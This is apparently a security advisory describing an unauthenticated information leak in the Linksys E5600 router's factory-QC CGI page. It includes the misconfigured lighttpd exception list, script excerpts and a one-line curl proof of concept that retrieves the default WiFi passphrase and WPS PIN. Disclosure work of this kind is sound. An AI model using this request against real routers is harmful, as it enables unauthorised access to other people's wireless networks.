# CVE-TBD: Linksys E5600 fqc.cgi Pre-Authentication Sensitive Information Disclosure

## Affected Product

- Vendor: Linksys
- Product: E5600
- Firmware: v1.1.0.26
- Component: `/www/cgi-bin/fqc.cgi` (shell script, factory-QC page)

## Summary

`/cgi-bin/fqc.cgi` is a factory quality-control page that is explicitly
listed in the web server's authentication exception list
(`session.exception-uri` in `lighttpd.conf`). Any unauthenticated network
client can retrieve device-identifying and credential material: serial
number, all interface MAC addresses, WiFi ESSIDs, the **default WiFi
passphrase**, the **default WPS PIN**, firmware version, region and boot
mode.

## Vulnerability Type / CWE

- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

## Root Cause

1. `lighttpd.conf` ships with:

   ```
   session.exception-uri = ( "login.html", "login.cgi", "login_s.cgi",
                             "crossecho.html", "fqc.cgi" )
   ```

   so `mod_session` never requires authentication for `fqc.cgi`.

2. The script itself outputs sensitive device data gathered from
   `gcontrol di get ...` (device identity store) and `objReq ...`:

   ```sh
   echo "<p class='content'>Serial Number: $SET_SN </p>"
   ...
   echo "<p class='content'>Default wifi password: $WIFI_PASSWORD ...</p>"
   echo "<p class='content'>Default WPS PIN: $WPSPIN ...</p>"
   ```

## Proof of Concept (non-destructive)

```bash
curl http://<ROUTER_IP>/cgi-bin/fqc.cgi
```

Observed result (no credentials supplied):

```
Firmware Version: 1.1.0.26
Serial Number: <device serial>
Region: ...
Lan MAC / Wan MAC / WiFi 2.4G MAC / WiFi 5G MAC: ...
2.4G ESSID / 5G ESSID: ...
Default wifi password: <factory default WPA passphrase>
Default WPS PIN: <factory WPS PIN>
Mode / boot partition: ...
```

(In the rehosted research environment the NVRAM-emulation layer returned
placeholder values for device-identity fields; the page logic and its
unauthenticated reachability were verified, and firmware version leaked
for real. On physical hardware these fields contain actual values.)

## Impact

- Exposure of the factory default WiFi passphrase and WPS PIN enables
  direct compromise of the wireless network of any device still running
  default wireless credentials.
- Serial number + MAC addresses facilitate targeted attacks, device
  tracking, and WPS PIN-based attacks (the disclosed PIN removes the need
  for brute force).

## Proposed CVSS 3.1

`AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` — **6.5 (Medium)**

## Discovery

- Date: 2026-10-10
- Method: configuration audit + dynamic verification on rehosted firmware
- Researcher: Zimo-666

## Timeline

- 2026-10-10: Vulnerability discovered and verified
- TBD: Vendor notification
- TBD: CVE ID assignment
- TBD: Public disclosure
